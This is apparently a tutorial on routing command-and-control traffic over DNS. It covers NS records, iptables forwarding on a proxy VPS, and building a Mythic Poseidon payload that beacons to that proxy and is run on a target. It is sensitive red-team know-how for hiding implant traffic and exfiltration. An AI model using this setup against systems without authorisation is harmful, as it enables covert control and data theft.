DNS Proxy for C2 Servers

What happens after a device has been hacked? , It’s known as post-exploitation. In this stage, command and control servers (C2 Servers) are a very used tool; they allow us to centralize the control over our infected devices (target computers). We can send tasks like system commands to execute; with them, targets perform actions like exfiltrating information or downloading a new payload to execute malware.

C2 servers use different communication methods, for example HTTP/HTTPS, to camouflage the network traffic and make it look similar to a normal request to a common web page, but we can use other network protocols to communicate with the server. Here I’ll show how to set up a DNS proxy to communicate with a C2 server.

Setup proxy DNS

But first, how does DNS (Domain Name System) work? Well, it’s like a translator, because IP addresses are difficult to remember by humans. For example, when a user enters a URL like google.com, the computer sends a DNS request to some servers until the IP address is found.

And it’s the same with subdomains this is the element that we’ll abuse to talk with the C2 server, a request to a DNS to resolve a subdomain look like this cdn.mydomain.com, note subdomain is added to the main domain mydomain.com, well We can send another subdomain likesomething.cdn.mydomain.com , and if we have a DNS server, it can resolve this petition, and a C2 server can host a DNS server to resolve this petition, but sending data that works as a message between the target and server, for example:

target: hello.cdn.mydomain.com  
server: hi.cdn.mydomain.com

NOTE: This tutorial uses a real environment, not a local lab. This infrastructure uses two VPS.

To make possible these communication methods, we need a domain; it can be obtained from different providers. Then, with a domain purchased, we need to create some DNS records.

  1. An A record to the name server
    2. NS Record managed by the A record

DNS records should be like the following table:

╔══════╦═══════════════════╦═══════════════════╦══════╗  
║ Type ║       Host        ║       Value       ║ TTL  ║  
╠══════╬═══════════════════╬═══════════════════╬══════╣  
║ A    ║ ns1.mydomain.com  ║ proxy-server-IP   ║ auto ║  
║ NS   ║ cdn.mydomain.com  ║ ns1.mydomain.com  ║ auto ║  
╚══════╩═══════════════════╩═══════════════════╩══════╝

In the first server, which is our DNS proxy and the one where the Arecord points, we need to enable IP forwarding and also create IP table rules for the forwarding. First, to enable IP forwarding, edit the file in /etc/sysctl.conf, add this line:

net.ipv4.ip_forward = 1

And apply change with:

sudo sysctl -p

For the IP table rules we need to create two, the first one to enable the rerouting and the last one to change the IP address from the proxy server to the C2 server to avoid bad DNS responses.

NOTE: Change C2_IP for your C2 server IP, and :53 is for DNS UDP port (53).

sudo iptables -t nat -A PREROUTING -p udp - dport 53 -j DNAT - to-destination C2_IP:53  
sudo iptables -t nat -A POSTROUTING -p udp - dport 53 -j MASQUERADE

Then in the C2 server, we need to enable INPUT and OUTPUT DNS traffic. These rules can be for all the origins and destinations or for a specific one. In this case, enabling INPUT and OUTPUT just for a specific host provides more security. Then the rules are:

sudo iptables -A INPUT -p udp - dport 53 -s PROXY_IP -m conntrack - ctstate NEW,ESTABLISHED -j ACCEPT  
sudo iptables -A OUTPUT -p udp - sport 53 -d PROXY_IP -m conntrack - ctstate ESTABLISHED -j ACCEPT

NOTE: Change PROXY_IP for the IP address of your proxy server, the same address to which Record A points.

This is all the basic configuration for the DNS proxy. To test this in the C2 server, run the following command to see the DNS traffic forwarded from the proxy.

sudo tcpdump -ni any port 53

To get test traffic, run the following command on the other computer:

dig @IP_PROXY cdn.mydomain.com.

NOTE: Use IP_PROXY to use it as a resolver, and change cdn.mydomain.com to your NS record, add the . and end.

If all is OK, you should see the traffic in tcpdump, but dig will get a timeout response because we don’t have a DNS server listening. If you can see the traffic in the tcpdump now, this configuration can work for many C2 servers that allow DNS communications.

Mythic C2 Server Example

If you want to install Mythic C2, read the documentation

Now to test with a C2 server in action, I’ll show an example to Mythic to use DNS in this server first. We need to install a specific agent and profile.

NOTE: Run these commands in the mythic installation directory.

Install Poseidon agent:

sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon

Install DNS profile:

sudo ./mythic-cli install github https://github.com/MythicC2Profiles/dns

NOTE: The DNS profile in Mythic is in beta version and only works for the Poseidon agent that targets Linux and macOS systems.

If the installation is successful, Mythic should show the profile and agent installed in the payload/C2 Service section like the following image:

In order to compile the payload to test our configured infrastructure, in the payload section, first select Linux as the target operating system because the Poseidon agent

In payload type, select the installed Poseidon agent and add DNS to the egress C2 profiles like the images show (HERE in red).

Here, click on next because Poseidon has a set of commands included by default and does not allow dynamic command loading.

In profile configuration, choose DNS. I set the callback interval to 5 seconds and jitter to 2 just for testing to reduce the time between each request, which is good for testing. In IP:PORT, add your proxy server IP address and add the 53 port for DNS, for example, 142.251.34.14:53, this is to force agent to use proxy IP as resolver. In the series of domains to use, add your NSrecord. Note that you can use more domains.

Finally, set a name for the payload and build it.

Now with the payload compiled as a Linux binary, transfer it to the target to test. In my case, I choose a Kali Linux VM with the network configured as a bridge adapter.

I resume in one line the following commands:

# rename binary  
mv ./dns_test.bin  
# make binary executable  
chmod +x ./dns_test  
# execute the binary  
./dns_test

You can run Wireshark in the target to see the DNS traffic from the target to the C2 server; use this filter to exclude extra traffic.

dns && ip.dst == PROXY_IP

The target will send petitions to C2 every 5 seconds with the jitter variation as the profile configuration.

If all is OK, Mythic will receive the callback connection, and Wireshark will show the traffic as the image from above.

With the callback working we can create task for the target, when the target send a DNS request It recibe the task from C2 server, target execute the task and return the result back to command and control server.

With this configuration you can deploy a C2 server using DNS protocol to communicate with the targets; just fit the steps of agent configuration for your command and control server in case you need it for Windows targets or use it in other C2 servers like Sliver or Havoc. This redirection method with the DNS proxy is very similar to using an HTTPS redirector.
